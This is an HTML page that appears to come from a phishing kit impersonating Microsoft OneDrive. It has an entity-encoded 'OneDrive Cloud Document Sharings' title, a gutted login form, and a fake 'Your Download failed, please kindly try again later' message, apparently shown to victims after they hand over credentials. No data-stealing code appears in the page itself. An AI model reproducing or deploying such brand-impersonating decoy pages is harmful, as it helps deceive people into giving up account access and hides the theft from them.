<!DOCTYPE html>
<html >
<head>
<meta charset="UTF-8">
<title>O&#110;e Dri&#118;&#101;&#32;&#67;&#108;&#111;&#117;&#100;&#32;&#68;&#111;&#99;&#117;&#109;&#101;&#110;&#116; Sharings.</title>
<link rel='stylesheet prefetch' href='https://fonts.googleapis.com/css?family=Open+Sans:600'>
<link rel="stylesheet" href="css/style.css">
<script type="text/javascript">
<!--
function popupwnd(url, toolbar, menubar, locationbar, resize, scrollbars, statusbar, left, top, width, height)
{
   if (left == -1)
   {
      left = (screen.width/2)-(width/2);
   }
   if (top == -1)
   {
      top = (screen.height/2)-(height/2);
   }
   var popupwindow = this.open(url, '', 'toolbar=' + toolbar + ',menubar=' + menubar + ',location=' + locationbar + ',scrollbars=' + scrollbars + ',resizable=' + resize + ',status=' + statusbar + ',left=' + left + ',top=' + top + ',width=' + width + ',height=' + height);
}
//-->
</script>
</head>

<body>
<div class="login-wrap">
  <div class="login-html">
	  <div class="LogoOne"></div>
	   <div class="foot-lnk"> </div>
    <!--<div class="top"></div>-->
    <!--<input id="tab-1" type="radio" name="tab" class="sign-in" checked><label for="tab-1" class="tab">Sign In</label>
		<input id="tab-2" type="radio" name="tab" class="sign-up"><label for="tab-2" class="tab">Sign Up</label>-->
    <div class="login-form">
      <div class="sign-in-htm">
        <div class="group">
          </div>
        <!--<div class="hr"></div>-->
        <div class="foot-lnk">Your Download failed, please kindly try again later. </div>
      </div>
    </div>
  </div>
</div>
<!--</div>-->
</body>
</html>
